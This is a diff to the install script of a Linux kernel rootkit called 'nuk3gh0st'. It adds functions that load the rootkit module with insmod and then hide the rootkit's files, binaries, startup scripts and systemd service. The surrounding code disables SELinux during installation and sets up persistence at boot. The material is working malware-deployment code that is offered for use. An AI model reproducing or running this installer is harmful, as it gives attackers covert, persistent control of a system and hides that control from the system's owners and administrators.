@@ -53,6 +53,39 @@ function enable_startup_service {
 	#echo ""
 }
 
+function load_rootkit {
+	echo -e "${item} Loading nuk3gh0st LKM rootkit"
+	echo -e "   ${purple} cmd: insmod /usr/share/nuk3gh0st/rootkit.ko${endColor}"
+	insmod /usr/share/nuk3gh0st/rootkit.ko
+	echo ""
+}
+
+function hide_rootkit_files {
+	echo -e "${item} Hidding nuk3gh0st files"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
+        nuk3gh0st --hide-file=rootkit.ko
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=load-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=load-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=unload-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=startup-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=rmstartup-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
+        nuk3gh0st --hide-file=nuk3gh0st.startup
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
+        nuk3gh0st --hide-file=nuk3gh0st.service
+        echo ""
+
+        echo -e "${yellow}WARNING: you won't be able to see the installation folder"
+        echo -e "until you unload the rootkit, but it will still exist "
+        echo -e "and you can access to it if you remember the path${endColor}"
+        echo ""
+}
+
 print_banner
 create_systemd_service
 echo -e "${item} Checking if SELINUX is enabled"
@@ -61,10 +94,12 @@ if [ -f /usr/sbin/semanage ]; then
 	#semanage permissive -a insmod_t
 	disable_selinux
 	enable_startup_service	
-	bash /usr/share/nuk3gh0st/nuk3gh0st.startup	
+	load_rootkit
+	hide_rootkit_files
 	enable_selinux
 else
 	echo -e "${item} SELINUX is disabled"
 	enable_startup_service
-	bash /usr/share/nuk3gh0st/nuk3gh0st.startup
+	load_rootkit
+	hide_rootkit_files
 fi
